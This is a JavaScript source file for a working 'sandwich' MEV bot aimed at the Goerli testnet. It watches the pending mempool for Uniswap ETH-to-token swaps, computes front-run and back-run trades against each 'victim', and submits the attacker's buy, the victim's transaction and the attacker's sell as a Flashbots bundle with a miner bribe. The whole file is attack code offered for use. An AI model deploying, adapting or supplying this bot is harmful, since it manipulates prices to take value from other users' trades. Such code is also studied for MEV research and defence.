import { Wallet, ethers } from "ethers";
import {
  FlashbotsBundleProvider,
  FlashbotsBundleResolution
} from "@flashbots/ethers-provider-bundle";
import dotenv from "dotenv";
dotenv.config();

// 1.1 Import ABIs and Bytecodes
import {
  UniswapAbi,
  UniswapBytecode,
  UniswapFactoryAbi,
  UniswapFactoryBytecode,
  pairAbi,
  pairBytecode,
  erc20Abi,
  erc20Bytecode,
  uniswapV3Abi
} from "./helpers/abis/abi.js";

// 1.2 Setup user modifiable variables
const flashbotsUrl = "https://relay-goerli.flashbots.net";
const wethAddress = "0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6";
const uniswapAddress = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D"; // UniswapV2Router02
const uniswapFactoryAddress = "0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f";
const universalRouterAddress = "0x4648a43B2C14Da09FdF82B161150d3F634f40491";
const httpProviderUrl = process.env.HTTP_PROVIDER_URL;
const wsProviderUrl = process.env.WS_PROVIDER_URL;
const privateKey = process.env.PRIVATE_KEY;
const chainId = 5;
const bribeToMiners = ethers.utils.parseUnits("200", "gwei");
var attackerEthAmountIn = ethers.utils.parseUnits("0.01", "ether");

const provider = new ethers.providers.JsonRpcProvider(httpProviderUrl);
const wsProvider = new ethers.providers.WebSocketProvider(wsProviderUrl);

const signingWallet = new Wallet(privateKey).connect(provider);
console.log("Attacker address:", signingWallet.address);
const uniswapV3Interface = new ethers.utils.Interface(uniswapV3Abi);
const factoryUniswapFactory = new ethers.ContractFactory(
  UniswapFactoryAbi,
  UniswapFactoryBytecode,
  signingWallet
).attach(uniswapFactoryAddress);
const erc20Factory = new ethers.ContractFactory(
  erc20Abi,
  erc20Bytecode,
  signingWallet
);
const pairFactory = new ethers.ContractFactory(
  pairAbi,
  pairBytecode,
  signingWallet
);
const uniswap = new ethers.ContractFactory(
  UniswapAbi,
  UniswapBytecode,
  signingWallet
).attach(uniswapAddress);
let flashbotsProvider = null;

// Decode uniswap universal router transactions
const decodeUniversalRouterSwap = (input) => {
  const abiCoder = new ethers.utils.AbiCoder();

  //   0000000000000000000000000000000000000000000000000000000000000002
  //   00000000000000000000000000000000000000000000000003782dace9d90000
  //   0000000000000000000000000000000000000000000000000258ec89a2bba93f
  //   00000000000000000000000000000000000000000000000000000000000000a0
  //   0000000000000000000000000000000000000000000000000000000000000000
  //   0000000000000000000000000000000000000000000000000000000000000002
  //   000000000000000000000000b4fbf271143f4fbf7b91a5ded31805e42b2208d6
  //   000000000000000000000000178e141a0e3b34152f73ff610437a7bf9b83267a

  const decodedParameters = abiCoder.decode(
    ["address", "uint256", "uint256", "bytes", "bool"],
    input
  );
  console.log("Decoded parameters:", decodedParameters);
  const breakdown = input.substring(2).match(/.{1,64}/g);

  let path = [];
  let hasTwoPath = true;
  if (breakdown.length != 9) {
    const pathOne = "0x" + breakdown[breakdown.length - 2].substring(24);
    const pathTwo = "0x" + breakdown[breakdown.length - 1].substring(24);
    path = [pathOne, pathTwo];
  } else {
    hasTwoPath = false;
  }

  return {
    recipient: parseInt(decodedParameters[0], 16),
    amountIn: decodedParameters[1],
    minAmountOut: decodedParameters[2],
    path,
    hasTwoPath
  };
};

// Setup initial checks
const initialChecks = async (tx) => {
  let transaction = null;
  let decoded = null;
  let decodedSwap = null;
  try {
    transaction = await provider.getTransaction(tx);
  } catch (error) {
    return false;
  }

  if (!transaction || !transaction.to) return false;

  if (Number(transaction.value) == 0) return false;

  if (transaction.to.toLowerCase() != universalRouterAddress.toLowerCase())
    return false;
  console.log("Uniswap universal router is called.");
  try {
    decoded = uniswapV3Interface.parseTransaction(transaction);
  } catch (error) {
    return false;
  }
  // If the swap is not for uniswapV2 we return it.
  if (!decoded.args.commands.includes("08")) {
    console.log("not v2");
    return false;
  }
  let swapPositionInCommands =
    decoded.args.commands.substring(2).indexOf("08") / 2;
  let inputPosition = decoded.args.inputs[swapPositionInCommands];
  decodedSwap = decodeUniversalRouterSwap(inputPosition);
  // we only need the transactions to swap ETH for tokens
  if (decodedSwap.recipient === 2) return false;
  if (decodedSwap.path[0].toLowerCase() != wethAddress.toLowerCase())
    return false;
  return {
    transaction,
    amountIn: transaction.value,
    minAmountOut: decodedSwap.minAmountOut,
    tokenToCapture: decodedSwap.path[1]
  };
};

const getAmountOut = (amountIn, reserveIn, reserveOut) => {
  if (amountIn <= 0) {
    console.log("INSUFFICIENT_INPUT_AMOUNT");
    return 0;
  }
  if (reserveIn <= 0 || reserveOut <= 0) {
    console.log("INSUFFICIENT_LIQUIDITY");
    return 0;
  }
  let amountInWithFee = amountIn.mul(997);
  let numerator = amountInWithFee.mul(reserveOut);
  let denominator = reserveIn.mul(1000).add(amountInWithFee);
  let amountOut = numerator.div(denominator);
  return amountOut;
};

const processTransaction = async (tx) => {
  const checksPassed = await initialChecks(tx);
  if (!checksPassed) return false;
  console.log("checksPassed", checksPassed);
  const { transaction, amountIn, minAmountOut, tokenToCapture } = checksPassed;
  // attackerEthAmountIn = amountIn;
  const pairAddress = await factoryUniswapFactory.getPair(
    wethAddress,
    tokenToCapture
  );
  const pair = pairFactory.attach(pairAddress);

  let reserves = null;
  try {
    reserves = await pair.getReserves();
  } catch (error) {
    return false;
  }

  let reserveA;
  let reserveB;
  if (wethAddress < tokenToCapture) {
    reserveA = reserves._reserve0;
    reserveB = reserves._reserve1;
  } else {
    reserveA = reserves._reserve1;
    reserveB = reserves._reserve0;
  }

  const maxGasFee = transaction.maxFeePerGas
    ? transaction.maxFeePerGas.add(bribeToMiners)
    : bribeToMiners;
  const priorityFee = transaction.maxPriorityFeePerGas
    ? transaction.maxPriorityFeePerGas.add(bribeToMiners)
    : bribeToMiners;

  // Buy using your ETH amount and calculate token amount out
  const attackerTokenAmountOut = getAmountOut(
    attackerEthAmountIn,
    reserveA,
    reserveB
  );
  const updatedReserveA = reserveA.add(attackerEthAmountIn);
  const updatedReserveB = reserveB.sub(attackerTokenAmountOut.mul(997).div(1000));
  const victimAmountOut = getAmountOut(
    amountIn,
    updatedReserveA,
    updatedReserveB
  );
  if (victimAmountOut.lt(minAmountOut)) {
    console.log("Victim would get less than the minimum amount out.");
    return false;
  }

  const updatedReserveA2 = updatedReserveA.add(amountIn);
  const updatedReserveB2 = updatedReserveB.sub(victimAmountOut.mul(997).div(1000));

  const attackerEthAmountOut = getAmountOut(
    attackerTokenAmountOut,
    updatedReserveB2,
    updatedReserveA2
  );

  // if (attackerEthAmountOut <= attackerEthAmountIn) {
  //   console.log("The attacker would get less ETH out than in");
  //   return false;
  // }

  // Prepare first transaction
  const deadline = Math.floor(Date.now() / 1000) + 60 * 60;
  let frontRunTransaction = {
    signer: signingWallet,
    transaction: uniswap.populateTransaction.swapExactETHForTokens(
      attackerTokenAmountOut,
      [wethAddress, tokenToCapture],
      signingWallet.address,
      deadline,
      {
        value: attackerEthAmountIn,
        type: 2,
        maxFeePerGas: maxGasFee,
        maxPriorityFeePerGas: priorityFee,
        gasLimit: 300000
      }
    )
  };

  frontRunTransaction.transaction = {
    ...frontRunTransaction.transaction,
    chainId
  };

  let victimTransactionWithChainId = {
    ...transaction,
    chainId
  };

  const signedVictimTransaction = {
    signedTransaction: ethers.utils.serializeTransaction(
      victimTransactionWithChainId,
      {
        r: victimTransactionWithChainId.r,
        s: victimTransactionWithChainId.s,
        v: victimTransactionWithChainId.v
      }
    )
  };

  const erc20 = erc20Factory.attach(tokenToCapture);
  let approveTransaction = {
    signer: signingWallet,
    transaction: erc20.populateTransaction.approve(
      uniswap.address,
      attackerTokenAmountOut,
      {
        value: "0",
        type: 2,
        maxFeePerGas: maxGasFee,
        maxPriorityFeePerGas: priorityFee,
        gasLimit: 300000
      }
    )
  };

  approveTransaction.transaction = {
    ...approveTransaction.transaction,
    chainId
  };

  let lastTransaction = {
    signer: signingWallet,
    transaction: await uniswap.populateTransaction.swapExactTokensForETH(
      attackerTokenAmountOut,
      attackerEthAmountOut,
      [tokenToCapture, wethAddress],
      signingWallet.address,
      deadline,
      {
        value: "0",
        type: 2,
        maxFeePerGas: maxGasFee,
        maxPriorityFeePerGas: priorityFee,
        gasLimit: 300000
      }
    )
  };

  lastTransaction.transaction = {
    ...lastTransaction.transaction,
    chainId
  };

  // Send transaction bundle with flashbots
  const transactionBundle = [
    frontRunTransaction,
    signedVictimTransaction,
    approveTransaction,
    lastTransaction
  ];

  const signedTransactions = await flashbotsProvider.signBundle(
    transactionBundle
  );
  const blockNumber = await provider.getBlockNumber();
  console.log("Simulating...");

  const simulation = await flashbotsProvider.simulate(
    signedTransactions,
    blockNumber + 1
  );
  if (simulation.firstRevert) {
    console.log(`Simulation error: ${simulation.firstRevert.error}`);
  } else {
    console.log(`Simulation Success: ${simulation}`);
  }

  let bundleSubmission;

  flashbotsProvider
    .sendRawBundle(signedTransactions, blockNumber + 1)
    .then((_bundleSubmission) => {
      bundleSubmission = _bundleSubmission;
      console.log("Bundle submitted", bundleSubmission.bundleHash);
      return bundleSubmission.wait();
    })
    .then(async (waitResponse) => {
      console.log("Wait response", FlashbotsBundleResolution[waitResponse]);
      if (waitResponse == FlashbotsBundleResolution.BundleIncluded) {
        console.log("-------------------------------------------");
        console.log("-------------------------------------------");
        console.log("----------- Bundle Included ---------------");
        console.log("-------------------------------------------");
        console.log("-------------------------------------------");
      } else if (
        waitResponse == FlashbotsBundleResolution.AccountNonceTooHigh
      ) {
        console.log("The victim transaction has been confirmed already");
      } else {
        console.log("Bundle hash", bundleSubmission.bundleHash);
        try {
          console.log({
            bundleStats: await flashbotsProvider.getBundleStats(
              bundleSubmission.bundleHash,
              blockNumber + 1
            ),
            userStats: await flashbotsProvider.getUserStats()
          });
        } catch (e) {
          return false;
        }
      }
    });
};

const start = async () => {
  flashbotsProvider = await FlashbotsBundleProvider.create(
    provider,
    signingWallet,
    flashbotsUrl
  );
  console.log("Listening on transaction for the chain id", chainId);
  wsProvider.on("pending", (tx) => {
    processTransaction(tx);
  });
};

start();
